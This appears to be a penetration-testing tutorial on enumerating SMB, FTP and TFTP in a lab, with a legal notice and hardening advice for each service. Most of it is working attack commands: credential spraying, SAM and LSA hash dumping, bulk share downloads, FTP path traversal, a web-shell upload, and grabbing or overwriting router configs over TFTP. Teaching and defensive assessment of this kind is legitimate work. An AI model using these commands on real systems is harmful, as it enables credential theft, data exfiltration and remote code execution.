# Mastering Enumeration: SMB, FTP & TFTP  - Part II

> ⚠️ Ethical & Legal Notice\
> This material is provided for **authorized penetration testers**, **red-team operators**, and **network administrators** who possess **explicit, written permission** to assess the target systems.\
> Unauthorized scanning or enumeration is **illegal** in most jurisdictions and violates the **Computer Fraud and Abuse Act (CFAA)**, **GDPR**, and similar statutes.\
> **Never** probe assets you do **not own** and **do not have contractual approval** to test.

***

## <mark style="color:yellow;">Mastering Enumeration: SMB, FTP & TFTP</mark>

> A field-grade, copy-paste reference with live commands, sample output, and defensive counter-measures.

***

### <mark style="color:yellow;">0. Lab Topology Used in Examples</mark>

| 🔸Role     | 🔸IP             | 🔸OS / Firmware                          |
| ---------- | ---------------- | ---------------------------------------- |
| Attacker   | `192.168.56.101` | Kali 2024.3                              |
| File-SRV01 | `192.168.56.102` | Windows Server 2022 (SMB shares, FTP)    |
| Linux-FTP  | `192.168.56.103` | vsftpd 3.0.5 (Ubuntu 22)                 |
| Router     | `192.168.56.1`   | Cisco IOS 15.7 (TFTP server for configs) |



***

### <mark style="color:yellow;">1. SMB Enumeration</mark>

#### 🔸1.1 Port Discovery & Banner Grabbing

```bash
nmap -p 445,139 -sV -sS 192.168.56.102
```

Expected:

```
445/tcp  open  microsoft-ds  Windows Server 2022
139/tcp  open  netbios-ssn
```

#### 🔸1.2 NULL Session (Anonymous Listing)

```bash
smbclient -L //192.168.56.102 -N
```

Output:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
SYSVOL          Disk      Logon server share
NETLOGON        Disk      Logon server share
```

> NULL session still enabled → **critical finding**.

#### 🔸1.3 SMB Version & OS Fingerprint

```bash
smbmap -H 192.168.56.102
```

Bonus:

```
[+] Guest session    IP: 192.168.56.102:445  Name: 192.168.56.102
Disk              Permissions     Comment
----              -----------     -------
C$                NO ACCESS       Default share
ADMIN$            NO ACCESS       Remote Admin
IPC$              READ ONLY       Remote IPC
```

#### 🔸1.4 Enumerate Users via RID Cycling

```bash
lookupsid.py anonymous@192.168.56.102
```

Sample:

```
S-1-5-21-1234567890-1234567890-1234567890-500  administrator
S-1-5-21-1234567890-1234567890-1234567890-501  guest
S-1-5-21-1234567890-1234567890-1234567890-1001 john
S-1-5-21-1234567890-1234567890-1234567890-1002 jane
```

Parallel mass spray:

```bash
for i in $(seq 1000 1200); do
  rpcclient -U "" -N -c "queryuser $i" 192.168.56.102 2>/dev/null | grep "User Name"
done
```

#### 🔸1.5 Password Policy via enum4linux-ng

```bash
enum4linux-ng -A 192.168.56.102 | tee smb-enum.txt
```

Extract:

```
Password Complexity: Enabled
Minimum Password Length: 8
Lockout Threshold: 5
Lockout Duration: 30 minutes
```

#### 🔸1.6 Share Permission Brute-Forcer

```bash
crackmapexec smb 192.168.56.102 --shares -u '' -p ''
```

If guest is disabled:

```bash
crackmapexec smb 192.168.56.102 --shares -u john -p Password1
```

#### 🔸1.7 Spider Shares for Sensitive Files

```bash
smbmap -H 192.168.56.102 -u john -p Password1 -r 'Department\Finance'
```

Recursive download:

```bash
smbclient //192.168.56.102/Finance -U john -c "recurse; prompt off; mget *"
```

#### 🔸1.8 LSA, SAM, & Secrets Dump (Authenticated)

```bash
secretsdump.py john:Password1@192.168.56.102
```

Output:

```
[+] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> Feed NTLM to hashcat mode 1000.

#### 🔸1.9 SMB-Signing Check (Relay Vector)

```bash
crackmapexec smb 192.168.56.102 --gen-relay-list relay-victims.txt
```

If **SMB signing = False** → **high-value relay target**.

#### 🔸1.10 Defensive Hardening

* Disable **NULL sessions** (`RestrictAnonymous = 2`).
* Enforce **SMB signing** (`RequireSecuritySignature = 1`).
* Disable **SMBv1** (PowerShell: `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`).
* Enable **Windows Defender Credential Guard** (LSASS isolation).
* Filter **TCP 445, 139** at perimeter or require **IPSec** tunnel.

***

### <mark style="color:yellow;">2. FTP Enumeration</mark>

#### 🔸2.1 Port & Banner Grab

```bash
nmap -p 21 -sV -sC 192.168.56.103
```

Output:

```
21/tcp open  ftp   vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed
| -rw-r--r--   1 0        0            3176 Jun 01 10:00 welcome.msg
```

#### 🔸2.2 Anonymous Login Test

```bash
ftp 192.168.56.103
Name: anonymous
Password: anonymous
ftp> ls -la
ftp> binary
ftp> get welcome.msg
```

#### 🔸2.3 FTP Bounce Scan (old but gold)

```bash
nmap -Pn -b anonymous:anonymous@192.168.56.103 192.168.56.0/24
```

> Modern vsftpd disables `PORT` bounce by default – verify with:

```bash
nmap -p 21 --script ftp-bounce 192.168.56.103
```

#### 🔸2.4 Brute-Force / Password Spray

```bash
hydra -L users.txt -P pass.txt -t 8 192.168.56.103 ftp
```

Medusa alternative:

```bash
medusa -h 192.168.56.103 -u mike -P pass.txt -M ftp
```

#### 🔸2.5 Directory Traversal Check

```bash
nmap -p 21 --script ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 192.168.56.103
```

Manual test:

```bash
ftp> get ../../../etc/passwd
```

If successful → **CVE-2011-0762** or **mis-chroot**.

#### 🔸2.6 Feature & Command Enumeration

```bash
telnet 192.168.56.103 21
```

Type:

```
FEAT
HELP
SITE HELP
```

Look for **SITE EXEC**, **CHMOD**, **UMASK** → indicators of **wu-ftpd** or **ProFTPd** with dangerous mods.

#### 🔸2.7 Sniff Cleartext Credentials

```bash
sudo tcpdump -i eth0 -A port 21 | grep -i pass
```

> Demonstrates why **FTPS (FTP over TLS)** is critical.

#### 🔸2.8 Upload Web-Shell (if writable web root)

```bash
ftp> put cmd.aspx /var/www/html/cmd.aspx
```

Access: `http://192.168.56.103/cmd.aspx?cmd=whoami`

#### 🔸2.9 Defensive Moves

* Disable **anonymous** (`anonymous_enable=NO` in vsftpd.conf).
* Enforce **TLS** (`ssl_enable=YES` + `force_local_data_ssl=YES`).
* Jail users with `chroot_local_user=YES`.
* Deploy **fail2ban** filter `vsftpd` to block brute IPs.
* Log every `STOR`, `RETR`, `DELE` to syslog.

***

### <mark style="color:yellow;">3. TFTP Enumeration (UDP 69)</mark>

#### 🔸3.1 Discover Service

```bash
nmap -sU -p 69 -sV 192.168.56.1
```

Output:

```
69/udp open  tftp  Cisco TFTP
```

#### 🔸3.2 Brute-Filename Download

**Common file list:**

```
cisco-config
startup-config
running-config
IOS.bin
router-confg
switch-confg
```

**Script:**

```bash
for file in $(cat tftp-filenames.txt); do
  tftp 192.168.56.1 <<EOF
mode binary
get $file
quit
EOF
done
```

Grabbed `startup-config`? → **Full router config** = passwords, SNMP communities, VPN PSKs.

#### 🔸3.3 Upload Test (Overwrite IOS Image)

```bash
echo "evil" > test.txt
tftp 192.168.56.1 <<EOF
mode binary
put test.txt
quit
EOF
```

If success → **replace IOS image** → **DoS or backdoor**.

#### 🔸3.4 Metasploit Auxiliary Scanner

```bash
msfconsole -q
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS 192.168.56.0/24
set FILENAME /usr/share/metasploit-framework/data/wordlists/tftp.txt
run
```

#### 🔸3.5 Sniff TFTP Traffic (No Encryption)

```bash
sudo tcpdump -i eth0 -n port 69 -w tftp.pcap
```

Wireshark → **File → Export Objects → TFTP** → extract all transferred files automatically.

#### 🔸3.6 Defensive Controls

* Restrict **TFTP source IPs** with ACL (`access-list 10 permit 192.168.56.0 0.0.0.255`).
* Use **SCP instead of TFTP** for Cisco IOS upgrades (`ip scp server enable`).
* Disable **TFTP service** entirely if unused (`no tftp-server`).
* Firewall **UDP 69** from any → any unless absolutely required.

***

### <mark style="color:yellow;">4. One-Liner Cheatsheet</mark>

| 🔸Service          | 🔸Port | 🔸Tool    | 🔸Command                       |
| ------------------ | ------ | --------- | ------------------------------- |
| **SMB share list** | 445    | smbclient | `smbclient -L //IP -N`          |
| **SMB RID cycle**  | 445    | lookupsid | `lookupsid.py anon@IP`          |
| **FTP anon test**  | 21     | ftp       | `ftp IP` → user `anonymous`     |
| **FTP brute**      | 21     | hydra     | `hydra -L users -P pass IP ftp` |
| **TFTP download**  | 69     | tftp      | `tftp IP <<< $'get file\nquit'` |
| **TFTP upload**    | 69     | tftp      | `tftp IP <<< $'put file\nquit'` |

***

### <mark style="color:yellow;">5. Reporting & Remediation Flow</mark>

1. **Screenshot** every successful anonymous login.
2. **Hashdump / config** → store encrypted, share only hash values (not plaintext).
3. **Risk rating**:
   * **Critical** – anonymous SMB + LSA secrets → full domain compromise.
   * **High** – writable FTP web root → RCE.
   * **Medium** – TFTP config leak → credential exposure.
4. **Recommendations**:
   * Disable legacy protocols (**SMBv1**, **anonymous FTP**, **TFTP**).
   * Enforce **SMB signing**, **FTP over TLS**, **SCP over SSH**.
   * Segment **file services** into separate VLAN with **IPSec** or **MACsec**.
   * Continuous **vulnerability scanning** (Nessus, OpenVAS) + **configuration drift detection** (Ansible, DSC).

***

> **Enumerate responsibly** – don't "be that guy" (or gal).
